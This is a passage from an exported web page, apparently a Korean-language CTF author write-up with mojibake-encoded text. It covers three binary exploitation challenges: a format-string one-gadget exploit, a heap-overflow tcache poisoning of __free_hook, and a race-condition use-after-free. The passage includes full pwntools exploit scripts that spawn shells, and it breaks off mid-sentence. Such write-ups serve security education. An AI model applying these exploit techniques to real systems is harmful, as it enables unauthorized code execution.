id=&quot;bc8bb230-714e-434f-b840-e054f0fe437a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë”°ë¼ì„œ, stack ë° libc leak ì´í›„ ret ë¥¼ oneshot ìœ¼ë¡œ ë³€ì¡°í•˜ì—¬ exploit í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;bafadaca-1721-4b64-9639-3ff48d0bbf18&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob972.png&quot;&gt;&lt;img style=&quot;width:1438px&quot; src=&quot;/assets/bob/bob972.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;01773885-913c-4d48-bae8-f46f84ec2579&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;exploit code&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;5e10b775-d207-4d06-9a7c-c4911a9151fd&quot; class=&quot;code&quot;&gt;&lt;code&gt;from pwn import *

bi = &amp;#x27;./pwn&amp;#x27;
r = process([bi])
#r = remote(&amp;#x27;localhost&amp;#x27;, 12002)

def reset():
    pay = &amp;#x27;%11$n&amp;#x27;
    r.sendlineafter(&amp;#x27;&amp;gt; &amp;#x27;, pay )

r.sendlineafter(&amp;#x27;: &amp;#x27;, &amp;#x27;gpsfly&amp;#x27;)

pay = &amp;#x27;%17$p&amp;#x27;
r.sendlineafter(&amp;#x27;&amp;gt; &amp;#x27;, pay )
libc = int(r.recvline().strip(), 16) - 0x21b97
log.info(&amp;quot;libc @ {}&amp;quot;.format(hex(libc)))
reset()

pay = &amp;#x27;%11$p&amp;#x27;
r.sendlineafter(&amp;#x27;&amp;gt; &amp;#x27;, pay)
stack = int(r.recvline().strip(), 16) - 0xc + 0x48
log.info(&amp;quot;stack @ {}&amp;quot;.format(hex(stack)))
reset()

oneshot = libc+0x4f2c5
oneshot = p64(oneshot)[:6]

for i in range(6):
    pay = &amp;#x27;%{}c%14$hhn&amp;#x27;.format(ord(oneshot[i]))
    pay = pay.ljust(0x10,&amp;#x27;A&amp;#x27;)
    pay += p64(stack+i)[:6]
    r.sendlineafter(&amp;#x27;&amp;gt; &amp;#x27;, pay)
    reset()

r.sendlineafter(&amp;#x27;&amp;gt; &amp;#x27;,&amp;#x27;&amp;#x27;)
r.sendlineafter(&amp;#x27;&amp;gt; &amp;#x27;,&amp;#x27;&amp;#x27;)

r.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;47e9bf38-b477-4494-9833-b203aefeeb92&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;6dc64837-93f5-489e-9547-e3846f86dd3d&quot; class=&quot;&quot;&gt;Housepital&lt;/h2&gt;&lt;hr id=&quot;0ac76e2c-2e8f-4b08-83ce-89a772abc114&quot;/&gt;&lt;figure id=&quot;e46a7d3f-3b2d-4333-801c-5b76026eab7e&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob973.png&quot;&gt;&lt;img style=&quot;width:792px&quot; src=&quot;/assets/bob/bob973.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;0dd7d2d2-feac-4733-86a9-1c90d8aba9de&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë³´í˜¸ê¸°ë²•&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;4cfb2688-243d-4180-9597-3b9f3d4a514f&quot; class=&quot;code&quot;&gt;&lt;code&gt;Canary                        : âœ“
NX                            : âœ“
PIE                           : âœ“
Fortify                       : âœ˜
RelRO                         : Full&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;579ef8ba-bfd7-4e3e-9c3c-9738e95046a7&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì‹¤í–‰ê²°ê³¼&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;cf3d2044-03a9-4eff-886c-a159c65ef246&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ ë°”ì´ë„ˆë¦¬ëŠ” &lt;code&gt;add&lt;/code&gt;, &lt;code&gt;view&lt;/code&gt;, &lt;code&gt;delete&lt;/code&gt; 3ê°€ì§€ ê¸°ëŠ¥ì´ ìˆìœ¼ë©° í™ ì˜ì—­ì— ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ì—¬ ì“°ê³ , ì½ê³ , í•´ì œí•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;cf104a8c-aa8e-4c29-b80f-821898aea1c5&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob974.png&quot;&gt;&lt;img style=&quot;width:288px&quot; src=&quot;/assets/bob/bob974.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;d6019bb9-0bec-4cb8-93b1-195a6faba6af&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;êµ¬ì¡°ì²´ í™•ì¸&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;6c6ff75a-d50b-4eb2-8adc-99a65f397cb6&quot; class=&quot;code&quot;&gt;&lt;code&gt;struct Patient
{
    char name[0x24]; # 24 bytes
    unsigned int age; # 4 bytes
    size_t gender; # 8 bytes
    char *sickness; # 8 bytes
};&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;dadb3c00-fc39-471e-8c09-f46cddf43be6&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì·¨ì•½ì  í™•ì¸ (add function)&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;23ffefcc-b536-4080-8929-54f42326fce5&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;25 line ì— scanf í•¨ìˆ˜ í˜¸ì¶œ ì‹œ &lt;code&gt;%lld&lt;/code&gt; í¬ë§·ì€ 8 ë°”ì´íŠ¸ ì…ë ¥ì„ ë°›ìœ¼ë©°, patient_list[i]â†’age ë³€ìˆ˜ëŠ” unsigned int (4 ë°”ì´íŠ¸)í˜• ë³€ìˆ˜ ì´ë¯€ë¡œ í•´ë‹¹ ì½”ë“œì—ì„œ &lt;code&gt;Type Confusion&lt;/code&gt; ì´ ë°œìƒí•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;ed7215d0-ac68-4ecf-8427-6eb9f71caae3&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ë¥¼ í†µí•´ ì•„ë˜ 26 line ë° 47 line ì„ í†µí•´ 0x40 chunk ë¥¼ í• ë‹¹ë°›ì•„ 0x80 ì‚¬ì´ì¦ˆ ë§Œí¼ ì…ë ¥ì„ ë°›ëŠ” ë“± &lt;code&gt;Heap Overflow&lt;/code&gt;ë¡œ ì•…ìš© ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;e56beb6d-1a5b-47f9-afb0-70085995e455&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob975.png&quot;&gt;&lt;img style=&quot;width:432px&quot; src=&quot;/assets/bob/bob975.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;dada12e4-c702-487b-8a56-d4b9ce9bf2df&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;exploit plan&lt;ol id=&quot;a43e8f44-8795-40d8-bba1-43925db1bde9&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;libc leak&lt;p id=&quot;816d62d2-8857-4e7f-84aa-b289b3b67599&quot; class=&quot;&quot;&gt;1.1. 0x420 ì´ìƒì˜ ì²­í¬ë¥¼ ë§Œë“  ë’¤ free í•˜ì—¬ &lt;code&gt;unsorted bin&lt;/code&gt; (libc-main_arena) ìƒì„±&lt;/p&gt;&lt;p id=&quot;9f8409ef-087f-4e76-854f-28da73426045&quot; class=&quot;&quot;&gt;1.2. view ë©”ë‰´ë¥¼ í†µí•´ libc ì£¼ì†Œ leak&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;2c9e40e8-d4b0-4300-8d2d-11bd268a5c46&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;rip ë³€ì¡°&lt;p id=&quot;e188edc1-eaea-49a0-b938-1989dbbf278c&quot; class=&quot;&quot;&gt;2.1. tcache bin ì˜ fd ë¥¼ &lt;code&gt;__malloc_hook&lt;/code&gt; ë˜ëŠ” &lt;code&gt;__free_hook&lt;/code&gt; ì£¼ì†Œë¡œ ë³€ì¡°&lt;/p&gt;&lt;p id=&quot;99db06d2-aed7-44c9-8664-d386d755756a&quot; class=&quot;&quot;&gt;2.2. tcache chunk í• ë‹¹ ì‹œ &lt;code&gt;oneshot&lt;/code&gt; ë˜ëŠ” &lt;code&gt;system&lt;/code&gt; ì£¼ì†Œë¡œ ë³€ì¡°&lt;/p&gt;&lt;p id=&quot;6d157398-e3d4-4e48-b251-60a0973f2ab7&quot; class=&quot;&quot;&gt;2.3. malloc ë˜ëŠ” free í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ íŠ¸ë¦¬ê±°&lt;/p&gt;&lt;ul id=&quot;3422e1bf-c20f-4ee1-b751-431c70c44b17&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;__free_hook ì„ system ì£¼ì†Œë¡œ ë³€ì¡° í•˜ì˜€ì„ ê²½ìš° í™ ë©”ëª¨ë¦¬ì— &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; ë¬¸ìì—´ ì €ì¥ í›„ í˜¸ì¶œ&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;c17fd4a3-7363-443e-b92f-951f79e9aa14&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;exploit code&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;436cadfc-cc4a-4d0d-ae69-735e6ea16ba3&quot; class=&quot;code&quot;&gt;&lt;code&gt;from pwn import *

bi = &amp;#x27;./pwn&amp;#x27;
r = process([bi])
#r = remote(&amp;#x27;localhost&amp;#x27;, 12003)
e = ELF(bi)
l = ELF(&amp;#x27;libc.so.6&amp;#x27;)
xla = lambda x : r.sendlineafter(&amp;#x27;: &amp;#x27;, str(x))
xa = lambda x : r.sendafter(&amp;#x27;: &amp;#x27;, str(x))
add = lambda name,gender,age,sickness : [xla(&amp;#x27;1&amp;#x27;), xa(name), xla(gender), xla(age), xa(sickness)]
view = lambda idx : [xla(&amp;#x27;2&amp;#x27;), xla(idx)]
dele = lambda idx : [xla(&amp;#x27;3&amp;#x27;), xla(idx)]


[add(&amp;#x27;Z&amp;#x27;, 0, 0xff, &amp;#x27;A&amp;#x27;) for _ in range(2)]

add(&amp;#x27;Z&amp;#x27;, 0, 0xff, &amp;#x27;A&amp;#x27;)
[add(&amp;#x27;A&amp;#x27;, 1, 0xff, &amp;#x27;A&amp;#x27;) for _ in range(5)]
add(&amp;#x27;A&amp;#x27;*8+p64(0x31), 1, 0xff, &amp;#x27;A&amp;#x27;)
dele(2)
pay = &amp;#x27;A&amp;#x27;*0x40
pay += p64(0) + p64(0x421)
add(&amp;#x27;Z&amp;#x27;, 0, 0x1000000ff, pay)
dele(3)
dele(2)
pay = &amp;#x27;A&amp;#x27;*0x50
add(&amp;#x27;Z&amp;#x27;, 0, 0x1000000ff, pay)
view(2)
r.recvuntil(&amp;#x27;sickness : {}&amp;#x27;.format(&amp;#x27;A&amp;#x27;*0x50))
libc = u64(r.recvline().strip().ljust(8,&amp;#x27;\x00&amp;#x27;)) - l.sym[&amp;#x27;__malloc_hook&amp;#x27;] - 0x70
log.info(&amp;quot;libc @ {}&amp;quot;.format(hex(libc)))

dele(2)
dele(4)
dele(5)
dele(6)

dele(1)
dele(0)
pay = &amp;#x27;A&amp;#x27;*0x40
pay += p64(0) + p64(0x41)
pay += p64(libc+l.sym[&amp;#x27;__free_hook&amp;#x27;])
add(&amp;#x27;Z&amp;#x27;, 0, 0x1000000ff, pay)

[add(p64(libc+l.sym[&amp;#x27;system&amp;#x27;]), 0, 0xff, &amp;#x27;/bin/sh&amp;#x27;) for _ in range(2)]
dele(1)

r.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;7bf957ba-659d-4a85-b782-b2ef1fe88b64&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;6e1fcb8e-bc22-4c2e-add9-2ec88a87e21c&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì¶”ê°€ì ìœ¼ë¡œ, ê°œë°œ ì‹¤ìˆ˜ë¡œ ì¸í•´ add í•¨ìˆ˜ì— í™ ë©”ëª¨ë¦¬ í• ë‹¹ ì‹œ í•´ë‹¹ ì˜ì—­ìœ¼ë¡œ ì´ˆê¸°í™”(memset ë˜ëŠ” calloc) í•˜ì§€ ì•Šì•„ &lt;code&gt;Uninitialized Heap&lt;/code&gt; ë²„ê·¸ê°€ ì¡´ì¬í•˜ë‹ˆ í•´ë‹¹ ë²„ê·¸ë¥¼ ì´ìš©í•˜ì—¬ exploit í•´ë³´ëŠ”ê²ƒë„ ì¶”ì²œí•œë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;a904a9d1-430c-4c61-a189-fab738407ad1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;d663832a-2820-4673-bfa9-c0e7e1ec964a&quot; class=&quot;&quot;&gt;Corona&lt;/h2&gt;&lt;hr id=&quot;552c2aac-ed8c-4212-93f8-db65a57ee07a&quot;/&gt;&lt;figure id=&quot;5783e8bd-9fc6-478c-808c-191be64f624b&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob976.png&quot;&gt;&lt;img style=&quot;width:716px&quot; src=&quot;/assets/bob/bob976.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;7803f804-8198-4f40-b0ff-e022e2167f0f&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;race conditionì„ ì´ìš©í•œ thread heap exploit challenge.&lt;/div&gt;&lt;/figure&gt;&lt;h3 id=&quot;c0339044-f85f-42fa-a0f2-e06cb10f6a27&quot; class=&quot;&quot;&gt;Challenge&lt;/h3&gt;&lt;p id=&quot;35155f4a-e6b0-4444-bd9b-6815a32f06b6&quot; class=&quot;&quot;&gt;ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë©”ë‰´ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;&lt;ol id=&quot;05b13ebc-f69e-488a-97b0-03581ee71dfe&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;Create house : house structure í• ë‹¹&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;f240b588-9d62-4d60-b172-127c8c684b64&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;Edit house : house name ìˆ˜ì •&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;02814321-6f2c-413a-b190-e71027919e11&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;Add person : person structure í• ë‹¹&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;377970e8-eae5-47be-b8f3-db8eca83aaf9&quot; class=&quot;numbered-list&quot; start=&quot;4&quot;&gt;&lt;li&gt;Check status : person ìƒíƒœ ì¶œë ¥ &lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;0156cdf4-7f45-43cb-bedd-f3d3c89f7f39&quot; class=&quot;numbered-list&quot; start=&quot;5&quot;&gt;&lt;li&gt;hidden : person name ìˆ˜ì • (í•œë²ˆë§Œ í˜¸ì¶œ ê°€ëŠ¥)&lt;/li&gt;&lt;/ol&gt;&lt;p id=&quot;089a1dd0-15db-491d-8252-8020f7509383&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;da62a731-8e0f-461a-a9cd-bc5b77c8d121&quot; class=&quot;&quot;&gt;ë˜í•œ í”„ë¡œê·¸ë¨ì—ëŠ” ë‘ê°œì˜ threadê°€ ë™ì‘í•˜ê³  ìˆë‹¤.&lt;/p&gt;&lt;ol id=&quot;6ed5ddd2-633f-4668-bd21-6d41775fc81d&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;t_virus : ëœë¤(3 + rand()%8)ìœ¼ë¡œ ì‚¬ëŒì„ í•œëª… ê°ì—¼ì‹œí‚¤ê³  person chunkë¥¼ free í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;a5bc9e4e-65e0-4902-80a4-5aac9f2609bc&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;t_day_check : 5ì´ˆì— í•œë²ˆì”© í•˜ë£¨ê°€ ì§€ë‚˜ë©° í•˜ë£¨ê°€ ì§€ë‚  ë•Œ ë§ˆë‹¤ ê°ì—¼ëœ person ê°ì²´ë¥¼ nullë¡œ ë®ì–´ì“´ë‹¤. &lt;/li&gt;&lt;/ol&gt;&lt;p id=&quot;797ac6b1-baff-4bf2-a8df-80b1290a1b30&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;67640cce-9f49-46c6-b032-df9b9e8d9f72&quot; class=&quot;&quot;&gt;Vulnerability&lt;/h3&gt;&lt;p id=&quot;95be14c8-55db-49cf-9ad6-f3a8f9503ff8&quot; class=&quot;&quot;&gt;ì·¨ì•½ì ì€ race conditionìœ¼ë¡œ, t_virus ì“°ë ˆë“œê°€ person chunkë¥¼ freeí•œ í›„ t_day_check ì“°ë ˆë“œê°€ person listë¥¼ freeí•˜ê¸° ì „ì— freeëœ person ì— ì ‘ê·¼í•˜ë©´ Use-After-Free ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤.&lt;/p&gt;&lt;p id=&quot;13882f90-e58c-4636-8f4e-4bc00e69c959&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;41134812-b32f-41e7-9515-be22aa27ec88&quot; class=&quot;&quot;&gt;Exploit&lt;/h3&gt;&lt;p id=&quot;5dfb5d0c-e660-4ad1-b017-1441e2a607f7&quot; class=&quot;&quot;&gt;exploitì— ì•ì„œ ì´ ë¬¸ì œë¥¼ ìµœëŒ€í•œ ë¹ ë¥´ê²Œ exploití•˜ê¸° ìœ„í•´ ì•Œê³ ìˆì–´ì•¼í•˜ëŠ” ë‘ê°€ì§€ê°€ ìˆë‹¤.&lt;/p&gt;&lt;ol id=&quot;10dd2a45-ee60-4087-972f-244beeadd4df&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;ë°”ì´ë„ˆë¦¬ì—ì„œ chunkë¥¼ freeí•˜ëŠ”ê²Œ ììœ ë¡­ì§€ ì•Šë‹¤. t_virus threadê°€ ëœë¤ìœ¼ë¡œ freeí•˜ëŠ”ë°, listì— chunkê°€ ì—†ì„ ê²½ìš° freeë˜ì§€ ì•Šì„ ìˆ˜ë„ ìˆë‹¤. ë”°ë¼ì„œ chunkë¥¼ ìµœëŒ€í•œ ë†’ì€ í™•ë¥ ë¡œ freeì‹œí‚¤ê¸° ìœ„í•´ì„œëŠ” ëª¨ë“  houseì— personì„ ì „ë¶€ ì±„ìš°ê³  free ë  ë•Œ ì¶œë ¥ë˜ëŠ” ë©”ì„¸ì§€ë¡œ ì–´ë–¤ ì²­í¬ê°€ freeëœê±´ì§€ êµ¬ë¶„í•˜ëŠ”ê²Œ ì¢‹ë‹¤ (&lt;code&gt;printf(&amp;quot;\n%s was infected ...\n&amp;quot;, house_list[rd]-&amp;gt;list[i]-&amp;gt;name);&lt;/code&gt;)
ê·¸ë˜ì„œ exploitì„ ì‘ì„±í•  ë•Œë„ íŠ¹ìˆ˜í•œ chunkê°€ freeë˜ëŠ”ê±¸ ê°€ì •í•˜ê¸° ë³´ë‹¤, ë‹¨ìˆœíˆ chunkê°€ freeë˜ëŠ” ì‚¬ì‹¤ì„ ì´ìš©í•´ ì½”ë“œë¥¼ ì‘ì„±í•´ì•¼ í•œë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ëœë¤ ë•Œë¬¸ì— ë””ë²„ê¹…ì´ ë§¤ìš° í˜ë“¤ê³  exploitì„ ì™„ì„±í•˜ëŠ”ë° ì˜¤ëœ ì‹œê°„ì´ ê±¸ë¦´ ê²ƒì´ë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;7a4a86da-6548-47b4-83bc-5fd6476239f6&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;raceë¥¼ ë‚´ëŠ” ì‹œê°„ì´ ë„ˆë¬´ ê¸¸ë‹¤. t_day_checkê°€ 5ì´ˆì´ê³  t_virusê°€ (rand()%8 + 3)ì´ˆì¸ë° ì‚¬ì‹¤ìƒ chunk í•˜ë‚˜ê°€ freeë˜ê¸° ìœ„í•´ì„œëŠ” ìµœì†Œ 3ì´ˆë¥¼ ê¸°ë‹¤ë ¤ì•¼í•œë‹¤ëŠ” ë§ì´ ëœë‹¤. ë¬¸ì œë¥¼ í’€ ë•ŒëŠ” ë°”ì´ë„ˆë¦¬ íŒ¨ì¹˜ë¡œ ì´ ê°’ì„ ì§§ê²Œ ì¤„ì—¬ì„œ exploití•´ì•¼ ë””ë²„ê¹…í•˜ëŠ”ë° ì‹œê°„ì„ ìµœì†Œí™”í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;p id=&quot;5430977e-4d7b-4403-b881-c1154aac6c86&quot; class=&quot;&quot;&gt;ì•„ë§ˆ ìœ„ ë‘ê°€ì§€ë¥¼ ì•ˆí–ˆë‹¤ë©´ ë””ë²„ê¹…ì´ ë§¤ìš° ë¶ˆí¸í–ˆì„ ê²ƒì´ë‹¤. ë‹¤ìŒì€ ì‹¤ì œë¡œ exploití•˜ëŠ” ìˆœì„œì´ë‹¤.&lt;/p&gt;&lt;ol id=&quot;d7a3cd7f-7d0c-48eb-8e01-dedb21ec0b4e&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;5ì¼ì§¸ì— libc leakì„ ì œê³µí•´ ì¤€ë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;fc224b9e-6f50-4369-8a4e-61cc5e69e51a&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;t_virusë¡œ 8ê°œì˜ chunkë¥¼ freeí•œë‹¤. (7ê°œì˜ chunkëŠ” tcacheì— ì €ì¥ë˜ë©° ë§ˆì§€ë§‰ chunkëŠ” fastbinì— ì €ì¥ëœë‹¤.)&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;a8fa21ce-c162-47ee-860f-61a42d3c97f6&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;hidden ë©”ë‰´ë¥¼ ì´ìš©í•´ fastbin chunkì˜ fdë¥¼ free hook - 0x10ìœ¼ë¡œ ëŒë¦°ë‹¤. (race condition íŠ¸ë¦¬ê±°)&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;552e81fb-74b4-4e5b-80c0-753385449d9c&quot; class=&quot;numbered-list&quot; start=&quot;4&quot;&gt;&lt;li&gt;ë™ì¼í•œ ì‚¬ì´ì¦ˆì˜ ì²­í¬ë¥¼ í•˜ë‚˜ ë” í• ë‹¹í•˜ë©´ fastbin chunkë¥¼ tcache bin ìœ¼ë¡œ ì˜®ê¸´ë‹¤. &lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;5ac3cbfa-62e5-40d7-98e5-d68d01aa14aa&quot; class=&quot;numbered-list&quot; start=&quot;5&quot;&gt;&lt;li&gt;tcache binì— ìˆëŠ” chunkë¥¼ í• ë‹¹ë°›ì•„ free_hookì— ì›í•˜ëŠ” ê°’ì„ ì“´ë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;59ccc5ad-5045-4c71-b914-cc319e1a8f81&quot; class=&quot;numbered-list&quot; start=&quot;6&quot;&gt;&lt;li&gt;person nameì— /bin/shë¥¼ ë„£ì–´ t_virusê°€ chunkë¥¼ freeí•  ë•Œ shellì„ íšë“í•œë‹¤. &lt;/li&gt;&lt;/ol&gt;&lt;p id=&quot;9d88b57c-f02a-472a-b383-9e17d35df419&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;a86d4353-0672-4f7b-aa82-4d17fe4c4c34&quot; class=&quot;&quot;&gt;Note&lt;/h3&gt;&lt;p id=&quot;f2722f26-52bf-423c-8267-fd7a572be525&quot; class=&quot;&quot;&gt;ì‚¬ì‹¤ ì´ ë¬¸ì œë¥¼ ì²˜ìŒ ê¸°íší–ˆì„ë•Œ í•µì‹¬ì ì¸ ë‚´ìš©ì€ libc ì£¼ì†Œë¥¼ leakí•˜ëŠ” ë¶€ë¶„ì´ì—ˆë‹¤. ë‹¤ë§Œ libcë¥¼ leakí•˜ëŠ” ë°©ë²•ì´ ìƒê°ë³´ë‹¤ ë„ˆë¬´ ì–´ë ¤ì›Œì ¸ì„œ ì´ê²ƒê³¼ í•¨ê»˜ tcache bin trickì„ ê°™ì´ ë‚¸ë‹¤ë©´ í‘¸ëŠ”ë° ë„ˆë¬´ ë§ì€ ì‹œê°„ì´ ê±¸ë¦´ê²ƒì´ë¼ íŒë‹¨í–ˆë‹¤. ê·¸ë˜ì„œ libc ì£¼ì†Œë¥¼ ì£¼ëŠ” ë°©í–¥ìœ¼ë¡œ ë¬¸ì œë¥¼ ë³€ê²½í–ˆê³ , exploitì—ì„œ ì•ˆì“°ëŠ” edit house ë©”ë‰´ê°€ ìˆëŠ” ì´ìœ ë„ leakì„ ì£¼ëŠ”ê±¸ë¡œ íŒ¨ì¹˜í•´ì„œ ê·¸ë ‡ë‹¤. (í•˜ì§€ë§Œ ì§€ê¸ˆ ë¬¸ì œì—ì„œë„ libc leakì„ í•  ìˆ˜ ìˆìœ¼ë‹ˆ ë„ì „í•´ë³´ê³  ì‹¶ìœ¼ì‹  ë¶„ë“¤ì€ ë„ì „í•´ ë³´ì‹œê¸¸..)&lt;/p&gt;&lt;p id=&quot;03a4ff7c-f969-4283-829a-2fe1973bc79f&quot; class=&quot;&quot;&gt;ê·¸ë¦¬ê³  exploitì˜ í•µì‹¬ì ì¸ ë‚´ìš© ì¤‘ì— tcache ê´€ë ¨ íŠ¸ë¦­ì´ ìˆëŠ”ë°, ì‚¬ì‹¤ ì´ê²ƒì€ ê³µê°œì ìœ¼ë¡œ ì•Œë ¤ì§€ê±°ë‚˜ í”íˆ ì‚¬ìš©ë˜ëŠ” íŠ¸ë¦­ì€ ì•„ë‹Œ ë§Œí¼ fastbin binì— ìˆëŠ” chunkê°€ tcacheìœ¼ë¡œ ì˜®ê²¨ì§„ë‹¤ëŠ” ì‚¬ì‹¤ì„ ëª¨ë¥´ëŠ” ë¶„ë“¤ì´ ë§ì„ ê²ƒì´ë¼ ìƒê°í–ˆë‹¤. íŠ¹íˆ CTFì—ì„œ heap ê´€ë ¨ ë¬¸ì œëŠ” ëª¨ë¥´ëŠ” íŠ¸ë¦­ì´ ë‚˜ì™€ ê³ ìƒí•˜ëŠ” ê²½ìš°ê°€ ë§ì€ë°, ì´ ë¬¸ì œì—ì„œëŠ” íŠ¸ë¦­ì„ ëª°ë¼ë„ ìì—°ìŠ¤ëŸ½ê²Œ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë„ë¡ ìµœëŒ€í•œ ìœ ë„í–ˆë‹¤.&lt;/p&gt;&lt;p id=&quot;60c2a61f-c282-4ff8-8301-a94c59f01726&quot; class=&quot;&quot;&gt;ê·¸ ë¶€ë¶„ì´ ë°”ë¡œ Person chunkë¥¼ 0x70 ì‚¬ì´ì¦ˆì˜ chunkë¡œ ì¤¬ë‹¤ëŠ” ì‚¬ì‹¤ì¸ë°, exploitì—ì„œ tcache bin íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ë©´ ì‚¬ì´ì¦ˆì™€ëŠ” ìƒê´€ ì—†ì´ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ë®ì–´ ì“¸ ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ì´ ì‚¬ì‹¤ì„ ëª¨ë¥´ëŠ” ë¶„ë“¤ì€ ì´ë¯¸ í”í•˜ê²Œ ì•Œë ¤ì§„ 0x70 fastbin chunkì˜ fdë¥¼ ë®ì–´ __malloc_hookì„ ë®ì–´ì“°ëŠ” exploitì„ ìƒê°í–ˆì„ ê²ƒì´ë‹¤. ë§Œì•½ ì´ëŸ° ìƒê°ì„ í†µí•´ exploitì„ ì‘ì„±í–ˆë‹¤ í•˜ë”ë¼ë„ __malloc_hookì„ ë®ì–´ì“°ëŠ” ê³¼ì •ì—ì„œ ìì—°ìŠ¤ëŸ½ê²Œ fastbin chunkê°€ tcache binìœ¼ë¡œ ì˜®ê²¨ì§€ëŠ” ì‚¬ì‹¤ì„ í™•ì¸í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. ì—¬ê¸°ì„œ ì¢€ë§Œ ë” ë””ë²„ê¹…ì„ í•˜ë‹¤ ë³´ë©´ exploitì„ ì™„ì„±í•  ìˆ˜ ìˆë„ë¡ ë¬¸ì œë¥¼ 